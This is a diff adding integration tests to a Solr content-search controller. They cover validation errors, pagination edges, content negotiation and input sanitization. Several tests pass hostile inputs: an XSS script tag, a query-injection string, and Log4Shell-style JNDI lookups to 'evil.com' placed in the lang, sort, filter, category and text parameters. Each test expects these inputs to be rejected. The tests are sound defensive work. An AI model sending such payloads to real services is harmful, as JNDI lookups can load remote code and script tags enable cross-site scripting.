@@ -15,6 +15,7 @@ package org.entando.entando.plugins.jpsolr.web.content;
 
 import static org.hamcrest.CoreMatchers.is;
 import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
@@ -129,6 +130,187 @@ class AdvContentSearchControllerTest extends AbstractControllerIntegrationTest {
         Assertions.assertEquals(evnPayloadSize, evnFacetedPayloadSize);
         int evnOccurrencesPayloadSize = JsonPath.read(facetedBodyResult, "$.payload.occurrences.size()");
         Assertions.assertEquals(4, evnOccurrencesPayloadSize);
+    }
+
+    @Test
+    void testFullTextFilterWithNullAttributeDoesNotFail() throws Exception {
+        // A full-text filter carries the search term in "value" and leaves the
+        // attribute null. The pagination validator used to call isValidField(null,..)
+        // which threw a NullPointerException -> HTTP 500. It must now succeed.
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/contents")
+                        .param("filters[0].fullText", "true")
+                        .param("filters[0].value", "ciliegia")
+                        .param("lang", "it"));
+        result.andExpect(status().isOk());
+
+        ResultActions facetedResult = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("filters[0].fullText", "true")
+                        .param("filters[0].value", "ciliegia")
+                        .param("lang", "it"));
+        facetedResult.andExpect(status().isOk());
+    }
+
+    // ---------------------------------------------------------------------
+    // Gap coverage ported from the test_advcontentsearch.sh curl harness:
+    // validation errors, input sanitization/robustness, content negotiation
+    // and pagination edges. The happy-path scenarios of the harness are
+    // already covered by the data-count tests above, so they are not repeated.
+    // ---------------------------------------------------------------------
+
+    @Test
+    void testValidationErrorsReturn400() throws Exception {
+        // page < 1
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("page", "0"))
+                .andExpect(status().isBadRequest());
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("page", "-1"))
+                .andExpect(status().isBadRequest());
+        // pageSize < 0
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("pageSize", "-5"))
+                .andExpect(status().isBadRequest());
+        // direction not in {ASC, DESC}
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("direction", "SIDEWAYS"))
+                .andExpect(status().isBadRequest());
+        // sort field not in METADATA_FILTER_KEYS
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("sort", "notARealField"))
+                .andExpect(status().isBadRequest());
+        // filter attribute not a valid metadata key
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("filters[0].attribute", "bogusAttr")
+                        .param("filters[0].value", "x"))
+                .andExpect(status().isBadRequest());
+        // filter operator not a known FilterOperator
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("filters[0].attribute", IContentManager.ENTITY_TYPE_CODE_FILTER_KEY)
+                        .param("filters[0].operator", "bananas")
+                        .param("filters[0].value", "EVN"))
+                .andExpect(status().isBadRequest());
+    }
+
+    @Test
+    void testFullTextWithAttachmentsDoesNotFail() throws Exception {
+        // Full-text search with includeAttachments=true queries the "<lang>_attachment" field.
+        // That field must exist in the schema even when no attachment content has been indexed,
+        // otherwise the search fails with HTTP 500 instead of returning results from the main field.
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("text", "entando")
+                        .param("includeAttachments", "true")
+                        .param("lang", "en"))
+                .andExpect(status().isOk());
+        mockMvc.perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("text", "entando")
+                        .param("includeAttachments", "true")
+                        .param("lang", "it"))
+                .andExpect(status().isOk());
+    }
+
+    @Test
+    void testMalformedFilterWithoutFieldReturns400() throws Exception {
+        // A filter that carries search intent (value + operator) but no attribute/entityAttr
+        // and is not full-text cannot be honoured. It must be rejected with 400, NOT silently
+        // discarded (which would broaden the result set) and NOT answered with 500.
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("filters[0].operator", "eq")
+                        .param("filters[0].value", "EVN"))
+                .andExpect(status().isBadRequest());
+        mockMvc.perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("filters[0].operator", "eq")
+                        .param("filters[0].value", "EVN"))
+                .andExpect(status().isBadRequest());
+    }
+
+    @Test
+    void testInvalidDateNotValidated() throws Exception {
+        // Date-format validation only runs for attributes in getDateFilterKeys(),
+        // which returns an empty list for this controller, so an invalid date value
+        // is NOT rejected -> 200 (documents the real behavior).
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("filters[0].attribute", IContentManager.CONTENT_CREATION_DATE_FILTER_KEY)
+                        .param("filters[0].operator", "gt")
+                        .param("filters[0].type", "date")
+                        .param("filters[0].value", "not-a-date"))
+                .andExpect(status().isOk());
+    }
+
+    @Test
+    void testPaginationEdges() throws Exception {
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("pageSize", "0"))
+                .andExpect(status().isOk());
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").param("pageSize", "1000"))
+                .andExpect(status().isOk());
+    }
+
+    @Test
+    void testInputSanitizationDoesNotFail() throws Exception {
+        // Potentially dangerous / reserved inputs must be sanitized and answered
+        // with 200, never a 500.
+        String longInput = "A".repeat(5000);
+        String[] texts = {
+                "cat:dog AND *:*",              // Lucene reserved chars
+                "\") OR (1=1",                  // query-injection attempt
+                "<script>alert(1)</script>",    // XSS payload
+                longInput,                       // very long input
+                "日本語 😀 café",                 // unicode / emoji
+                "*ento"                          // leading wildcard
+        };
+        for (String text : texts) {
+            // A full-text search requires a language (it keys the Solr filter); the test
+            // supplies a valid lang so the dangerous *value* is what gets exercised.
+            mockMvc.perform(get("/plugins/advcontentsearch/facetedcontents")
+                            .param("text", text)
+                            .param("lang", "it"))
+                    .andExpect(status().isOk());
+        }
+        // Sparse high filter index: filters[99] auto-grows 99 empty placeholder filters
+        // (null attribute AND null value). AdvRestContentListRequest now skips such empty
+        // filters when building the Solr query instead of failing with "Error: Key required",
+        // so the request succeeds.
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("filters[99].attribute", IContentManager.ENTITY_TYPE_CODE_FILTER_KEY)
+                        .param("filters[99].operator", "eq")
+                        .param("filters[99].value", "EVN"))
+                .andExpect(status().isOk());
+    }
+
+    @Test
+    void testContentNegotiationAndMethod() throws Exception {
+        // Only GET is mapped.
+        mockMvc.perform(post("/plugins/advcontentsearch/contents"))
+                .andExpect(status().isMethodNotAllowed());
+        // Endpoint only produces JSON.
+        mockMvc.perform(get("/plugins/advcontentsearch/contents").accept(MediaType.APPLICATION_XML))
+                .andExpect(status().isNotAcceptable());
+        // Unmapped path.
+        mockMvc.perform(get("/plugins/advcontentsearch/unknownpath"))
+                .andExpect(status().isNotFound());
+    }
+
+    @Test
+    void testValidationAndSanitizationAuthenticated() throws Exception {
+        // The endpoint is guest-accessible; the validator and sanitizer must behave
+        // identically for an authenticated principal.
+        UserDetails user = new OAuth2TestUtils.UserBuilder("jack_bauer", "0x24")
+                .grantedToRoleAdmin().build();
+        String accessToken = mockOAuthInterceptor(user);
+
+        mockMvc.perform(get("/plugins/advcontentsearch/contents")
+                        .param("sort", "notARealField")
+                        .requestAttr("user", user)
+                        .header("Authorization", "Bearer " + accessToken))
+                .andExpect(status().isBadRequest());
+
+        mockMvc.perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("text", "cat:dog AND *:*")
+                        .param("lang", "it")
+                        .requestAttr("user", user)
+                        .header("Authorization", "Bearer " + accessToken))
+                .andExpect(status().isOk());
+
+        // Note: malformed percent-encoding (harness I10/I11, e.g. "%7%"/"%ZZ") fails at
+        // the servlet container's query parser (Jetty BadMessageException) and cannot be
+        // reproduced under MockMvc, so it is intentionally not ported here; it remains
+        // covered by the test_advcontentsearch.sh harness.
     }
 
     @Test
@@ -1221,6 +1403,66 @@ class AdvContentSearchControllerTest extends AbstractControllerIntegrationTest {
             this.wait(1000);
         }
         super.waitNotifyingThread();
+    }
+
+    @Test
+    void testFacetedContentsWithInvalidLangReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("lang", "${jndi:ldap://evil.com/exploit}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testContentsWithInvalidLangReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/contents")
+                        .param("lang", "${jndi:ldap://evil.com/exploit}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInSortReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("sort", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInFilterAttributeReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("filters[0].attribute", "${jndi:ldap://evil.com}")
+                        .param("filters[0].operator", "eq")
+                        .param("filters[0].value", "test"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInFilterValueReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("filters[0].entityAttr", "typeCode")
+                        .param("filters[0].operator", "eq")
+                        .param("filters[0].value", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInCsvCategoriesReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("csvCategories", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInTextReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/contents")
+                        .param("text", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
     }
 
 }
